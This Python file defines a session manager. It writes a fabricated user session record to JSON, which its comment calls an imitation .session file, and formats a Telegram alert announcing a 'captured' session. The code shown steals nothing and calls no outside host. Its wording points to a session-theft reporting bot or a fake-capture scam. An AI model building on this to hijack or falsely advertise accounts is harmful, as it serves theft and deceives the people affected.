import json
from datetime import datetime
from config import settings

class SessionManager:
    @staticmethod
    async def generate_session_file(user_id, username):
        """Создает структуру сессии пользователя"""
        session = {
            "session_id": f"sess_{user_id}_{datetime.now().timestamp()}",
            "user": {
                "id": user_id,
                "username": username,
                "login_time": datetime.now().isoformat()
            },
            "security": {
                "encryption": "AES-256",
                "status": "Active"
            },
            "permissions": ["read", "write", "share"]
        }
        
        # Сохранение в текстовый файл (имитация .session файла)
        filename = f"session_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        file_path = f"{settings.SESSION_DIR}/{filename}"
        
        import os
        os.makedirs(settings.SESSION_DIR, exist_ok=True)
        
        with open(file_path, 'w') as f:
            json.dump(session, f, indent=4)
            
        return file_path, session

    @staticmethod
    def format_session_for_telegram(session_data):
        """Форматирует данные сессии для отправки в Telegram"""
        text = f"""
🔐 *Новая сессия захвачена*

👤 **User ID:** {session_data['user']['id']}
📝 **Name:** @{session_data['user']['username']}
🕒 **Login Time:** {session_data['user']['login_time']}
🛡️ **Status:** {session_data['security']['status']}

🔗 *Файл сессии:* `{session_data['session_id']}`
"""
        return text
